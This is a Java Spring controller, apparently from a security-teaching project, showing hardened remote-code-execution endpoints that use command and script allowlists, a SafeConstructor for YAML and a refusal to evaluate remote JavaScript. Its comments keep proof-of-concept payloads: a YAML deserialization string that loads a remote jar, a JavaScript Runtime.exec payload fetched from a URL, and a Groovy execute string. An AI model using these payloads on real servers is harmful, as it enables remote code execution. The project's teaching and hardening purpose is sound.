package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import org.joychou.util.WebUtils;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    /**
     * Fixed server-side command allowlist: key -> hard-coded argv. Request data only selects
     * a key; it is never placed into the argv or passed to the process API.
     */
    private static final Map<String, String[]> COMMANDS;

    static {
        Map<String, String[]> m = new HashMap<>();
        m.put("whoami", new String[]{"whoami"});
        m.put("date", new String[]{"date"});
        m.put("hostname", new String[]{"hostname"});
        m.put("uname", new String[]{"uname"});
        m.put("id", new String[]{"id"});
        m.put("pwd", new String[]{"pwd"});
        COMMANDS = Collections.unmodifiableMap(m);
    }

    /**
     * Fixed allowlist of Groovy scripts: key -> hard-coded script source.
     */
    private static final Map<String, String> GROOVY_SCRIPTS;

    static {
        Map<String, String> m = new HashMap<>();
        m.put("hello", "'hello'.toUpperCase()");
        m.put("sum", "(1..10).sum()");
        GROOVY_SCRIPTS = Collections.unmodifiableMap(m);
    }

    /**
     * Look up a command key in the allowlist; returns a fresh copy of the fixed argv or null.
     */
    private static String[] lookupCommand(String key) {
        if (key == null) {
            return null;
        }
        String[] fixed = COMMANDS.get(key.trim());
        return fixed == null ? null : fixed.clone();
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            String[] argv = lookupCommand(cmd);
            if (argv == null) {
                return "Bad boy. I got u.";
            }
            Process p = run.exec(argv);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("Command execution failed: {}", e.getClass().getSimpleName());
            return "Request failed.";
        }
        return WebUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] arrCmd = lookupCommand(cmd);
            if (arrCmd == null) {
                return "Bad boy. I got u.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error("Command execution failed: {}", e.getClass().getSimpleName());
            return "Request failed.";
        }

        return WebUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) {
        // Remote script evaluation is denied (fail closed). The JavaScript engine cannot be
        // restricted using only javax.script (Nashorn's --no-java option needs JDK-specific
        // APIs that are absent from modern JDKs), so a remotely loaded script could reach
        // java.lang.Runtime. Never evaluate attacker-supplied URLs.
        return "Bad boy. I got u.";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class tags are rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        // Request data only selects a precompiled-script key; it is never evaluated as Groovy.
        String script = content == null ? null : GROOVY_SCRIPTS.get(content.trim());
        if (script == null) {
            return "Bad boy. I got u.";
        }
        GroovyShell groovyShell = new GroovyShell();
        return WebUtils.htmlEscape(String.valueOf(groovyShell.evaluate(script)));
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

